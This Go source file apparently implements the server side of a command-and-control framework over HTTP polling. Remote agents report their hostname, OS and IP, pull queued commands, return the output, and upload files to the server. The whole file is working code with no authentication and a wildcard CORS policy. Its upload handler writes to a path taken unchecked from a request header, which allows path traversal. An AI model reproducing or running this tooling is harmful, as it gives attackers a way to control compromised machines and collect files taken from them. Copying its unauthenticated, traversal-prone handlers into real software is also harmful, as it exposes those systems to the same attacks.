package protocols

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"
)

type HTTPPollingProtocol struct {
	config   BaseProtocolConfig
	commands struct {
		sync.Mutex
		queue []string
	}
	results struct {
		sync.Mutex
		queue []CommandResult
	}
	agents struct {
		sync.Mutex
		list map[string]*Agent
	}
}

type CommandResult struct {
	Command   string `json:"command"`
	Output    string `json:"output"`
	Timestamp string `json:"timestamp"`
}

type Agent struct {
	ID       string    `json:"id"`
	OS       string    `json:"os"`
	Hostname string    `json:"hostname"`
	IP       string    `json:"ip"`
	LastSeen time.Time `json:"last_seen"`
	Commands []string  `json:"last_commands"`
}

func NewHTTPPollingProtocol(config BaseProtocolConfig) *HTTPPollingProtocol {
	return &HTTPPollingProtocol{
		config: config,
		agents: struct {
			sync.Mutex
			list map[string]*Agent
		}{list: make(map[string]*Agent)},
	}
}

func (p *HTTPPollingProtocol) Initialize() error {
	return os.MkdirAll(p.config.UploadDir, 0755)
}

func (p *HTTPPollingProtocol) HandleCommand(cmd string) error {
	p.commands.Lock()
	p.commands.queue = append(p.commands.queue, cmd)
	p.commands.Unlock()
	return nil
}

func (p *HTTPPollingProtocol) HandleFileUpload(filename string, fileData io.Reader) error {
	filepath := filepath.Join(p.config.UploadDir, filename)
	file, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = io.Copy(file, fileData)
	return err
}

func (p *HTTPPollingProtocol) HandleFileDownload(filename string) (io.Reader, error) {
	return os.Open(filepath.Join(p.config.UploadDir, filename))
}

func (p *HTTPPollingProtocol) HandleAgentHeartbeat(agentData []byte) error {
	var agent Agent
	if err := json.Unmarshal(agentData, &agent); err != nil {
		return err
	}

	p.agents.Lock()
	agent.LastSeen = time.Now()
	p.agents.list[agent.ID] = &agent
	p.agents.Unlock()

	return nil
}

func (p *HTTPPollingProtocol) GetRoutes() map[string]http.HandlerFunc {
	return map[string]http.HandlerFunc{
		"/queue_command":   p.handleQueueCommand,
		"/get_command":     p.handleGetCommand,
		"/submit_result":   p.handleSubmitResult,
		"/get_results":     p.handleGetResults,
		"/files/upload":    p.handleFileUpload,
		"/files/list":      p.handleListFiles,
		"/agent/heartbeat": p.handleAgentHeartbeat,
		"/agent/list":      p.handleListAgents,
	}
}

func enableCors(w *http.ResponseWriter) {
	(*w).Header().Set("Access-Control-Allow-Origin", "*")
	(*w).Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS, PUT, DELETE")
	(*w).Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Filename, X-Command")
	(*w).Header().Set("Access-Control-Max-Age", "86400")
}

// HTTP Handlers
func (p *HTTPPollingProtocol) handleQueueCommand(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	cmd := make([]byte, r.ContentLength)
	r.Body.Read(cmd)
	p.HandleCommand(string(cmd))
	fmt.Fprintf(w, "Command queued")
}

func (p *HTTPPollingProtocol) handleGetCommand(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	p.commands.Lock()
	defer p.commands.Unlock()

	if len(p.commands.queue) == 0 {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	cmd := p.commands.queue[0]
	p.commands.queue = p.commands.queue[1:]
	w.Write([]byte(cmd))
}

func (p *HTTPPollingProtocol) handleSubmitResult(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Error reading request body", http.StatusBadRequest)
		return
	}

	result := CommandResult{
		Command:   r.Header.Get("X-Command"),
		Output:    string(body),
		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
	}

	p.results.Lock()
	p.results.queue = append(p.results.queue, result)
	p.results.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "success"})
}

func (p *HTTPPollingProtocol) handleGetResults(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	w.Header().Set("Content-Type", "application/json")

	p.results.Lock()
	defer p.results.Unlock()

	if len(p.results.queue) == 0 {
		w.Write([]byte("[]"))
		return
	}

	json.NewEncoder(w).Encode(p.results.queue)
	p.results.queue = nil
}

func (p *HTTPPollingProtocol) handleFileUpload(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	filename := r.Header.Get("X-Filename")
	if filename == "" {
		http.Error(w, "Missing X-Filename header", http.StatusBadRequest)
		return
	}

	if err := p.HandleFileUpload(filename, r.Body); err != nil {
		log.Printf("Error handling file upload: %v", err)
		http.Error(w, "Failed to handle file upload", http.StatusInternalServerError)
		return
	}
}

func (p *HTTPPollingProtocol) handleListFiles(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	files, err := os.ReadDir(p.config.UploadDir)
	if err != nil {
		http.Error(w, "Failed to list files", http.StatusInternalServerError)
		return
	}

	type FileInfo struct {
		Name    string `json:"name"`
		Size    int64  `json:"size"`
		ModTime string `json:"modified"`
	}

	var fileList []FileInfo
	for _, file := range files {
		info, err := file.Info()
		if err != nil {
			continue
		}
		fileList = append(fileList, FileInfo{
			Name:    file.Name(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format(time.RFC3339),
		})
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(fileList)
}

func (p *HTTPPollingProtocol) handleAgentHeartbeat(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Error reading request body", http.StatusBadRequest)
		return
	}

	if err := p.HandleAgentHeartbeat(body); err != nil {
		http.Error(w, "Error processing agent data", http.StatusBadRequest)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"status":      "connected",
		"server_time": time.Now().Format(time.RFC3339),
	})
}

func (p *HTTPPollingProtocol) handleListAgents(w http.ResponseWriter, r *http.Request) {
	enableCors(&w)
	p.agents.Lock()
	defer p.agents.Unlock()

	// Clean up stale agents (not seen in last 5 minutes)
	for id, agent := range p.agents.list {
		if time.Since(agent.LastSeen) > 5*time.Minute {
			delete(p.agents.list, id)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(p.agents.list)
}
